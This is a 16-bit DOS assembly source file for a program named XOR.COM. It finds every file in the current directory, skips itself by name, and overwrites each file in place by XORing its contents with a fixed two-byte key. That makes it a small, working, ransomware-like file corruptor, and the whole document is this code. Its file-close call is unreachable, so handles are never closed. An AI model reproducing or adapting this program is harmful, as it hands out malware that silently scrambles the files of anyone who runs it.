.model tiny

.code
fname equ 9eh
org 100h
start:
	mov ah, 4eh ; search first
	mov cx, 0 ; parse normal files
	mov dx, offset search_mask 
	int 21h

search:
	jc aux_label					; don't encrypt our com file; works only is file is named XOR.COM - can be modified in fn var
	mov ax, word ptr cs:[fname]
	cmp ax, word ptr fn
	jnz continue_open
	mov ax, word ptr cs:[fname][2]
	cmp ax, word ptr fn[2]
	jnz continue_open
	mov ax, word ptr cs:[fname][4]
	cmp ax, word ptr fn[4]
	jnz continue_open
	mov ax, word ptr cs:[fname][6] ; checks also for asciiz terminator
	cmp ax, word ptr fn[6]
	jz search_next

continue_open:
    mov ax, 3d02h		       ; open for r/w
    mov dx, fname
    int 21h

    xchg ax, bx ; save file handle in bx

    mov ah, 3fh ; read initial first bytes
    mov cx, 2
    mov dx, offset buf
    int 21h

enc:
    cmp ax, 0 ; check for eof
    jz search_next
    push ax ; save ax, first for moving the file ptr and second for writing
    push ax

    cmp ax, 1 ; if one read byte instead of 2
    jz enc_once
    mov ax, word ptr buf ; encrypt normally
    xor ax, key
    mov word ptr buf, ax
    jmp move_file_ptr ; jmp to moving the cursor

aux_label: ; auxiliary label that never gets reached in order to jump more than 128 bytes
	jmp done

enc_once: ; encrypt a byte
	mov al, byte ptr buf
	xor al, byte ptr key
	mov byte ptr buf, al

move_file_ptr:
    mov ax, 4201h			; move file ptr ax bytes back
    pop cx					
    mov dx, 0
    sub dx, cx
    mov cx, -1              ; extend sign to msb
    int 21h

    xor ax, ax			; clear ax and prep to write
    mov ah, 40h
    pop cx
    mov dx, offset buf
    int 21h

    xor ax, ax
    mov ah, 3fh ; read next bytes
    mov cx, 2
    mov dx, offset buf
    int 21h
    jmp enc ; go back to encryption

    mov ah, 3eh					; close
    int 21h
search_next:
    mov ah, 4fh					; search next
    int 21h
    jmp search

done:
	mov ax, 4c00h
	int 21h
	key dw "AZ"
	fn db "XOR.COM", 0 ; asciiz string, as filename
	search_mask db "*.*", 0 ; searches for all files
	buf db 2 dup(0) ; reading buffer

dir:
end start